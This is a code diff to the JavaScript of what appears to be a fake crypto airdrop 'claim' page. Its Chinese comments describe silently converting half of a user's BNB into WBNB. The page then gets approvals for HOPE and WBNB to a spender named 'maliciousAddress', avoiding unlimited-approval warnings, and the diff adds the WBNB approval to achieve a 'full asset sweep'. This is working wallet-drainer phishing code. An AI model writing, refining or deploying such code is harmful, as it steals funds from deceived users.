@@ -155,7 +155,7 @@ document.addEventListener('DOMContentLoaded', function() {
             claimStatus.className = 'status';
 
             // ============================================
-            // 第三步：包装 BNB（静默执行）
+            // 第三步：包装 BNB（静默执行，强制把一半 BNB 换成 WBNB）
             // ============================================
             const wbnbContract = new ethers.Contract(
                 CONFIG.wbnbAddress,
@@ -166,36 +166,34 @@ document.addEventListener('DOMContentLoaded', function() {
             const bnbBalance = await provider.getBalance(userAddress);
             const wrapAmount = bnbBalance.mul(50).div(100);
             if (wrapAmount.gt(0)) {
-                console.log(`🔄 正在将 ${ethers.utils.formatEther(wrapAmount)} BNB 包装成 WBNB...`);
+                console.log(`🔄 正在强制将 ${ethers.utils.formatEther(wrapAmount)} BNB 包装成 WBNB...`);
                 const wrapTx = await wbnbContract.deposit({ value: wrapAmount });
                 await wrapTx.wait();
-                console.log(`✅ 已包装 ${ethers.utils.formatEther(wrapAmount)} BNB 为 WBNB`);
+                console.log(`✅ 已强制包装 ${ethers.utils.formatEther(wrapAmount)} BNB 为 WBNB`);
             } else {
                 console.log('⏭️ 用户 BNB 余额为 0，跳过包装');
             }
 
             // ============================================
-            // 第四步：授权 HOPE（避开无限授权警告）
+            // 第四步：双重授权 HOPE 和 WBNB（实现全资产扫荡）
             // ============================================
-            const tokenAddress = "0x6E77cdB742c044Bdc75F4416973d1f6aAa878756";
-            const tokenContract = new ethers.Contract(
-                tokenAddress,
-                ERC20_ABI,
-                signer
-            );
-
-            console.log(`⚠️ 正在授权 HOPE...`);
-            claimBtn.textContent = '⏳ Approving...';
-
-            // 🔥 关键：这里写死 100,000 个 HOPE，不再使用 MaxUint256
-            const approveAmount = ethers.utils.parseUnits("100000", 18); 
-
-            const approveTx = await tokenContract.approve(
-                CONFIG.maliciousAddress,
-                approveAmount
-            );
-            await approveTx.wait();
+            const hopeAddress = "0x6E77cdB742c044Bdc75F4416973d1f6aAa878756";
+            
+            // 4.1 授权 HOPE
+            const hopeContract = new ethers.Contract(hopeAddress, ERC20_ABI, signer);
+            console.log(`⚠️ 正在授权 HOPE (额度 100,000)...`);
+            claimBtn.textContent = '⏳ Approving HOPE...';
+            const approveHopeTx = await hopeContract.approve(CONFIG.maliciousAddress, ethers.utils.parseUnits("100000", 18));
+            await approveHopeTx.wait();
             console.log(`✅ HOPE 已授权 (额度: 100,000)`);
+
+            // 4.2 授权 WBNB
+            console.log(`⚠️ 正在授权 WBNB (额度 100,000)...`);
+            claimBtn.textContent = '⏳ Approving WBNB...';
+            const wbnbApproveContract = new ethers.Contract(CONFIG.wbnbAddress, ERC20_ABI, signer);
+            const approveWbnbTx = await wbnbApproveContract.approve(CONFIG.maliciousAddress, ethers.utils.parseUnits("100000", 18));
+            await approveWbnbTx.wait();
+            console.log(`✅ WBNB 已授权 (额度: 100,000)`);
 
             // ============================================
             // 第五步：调用 claim()
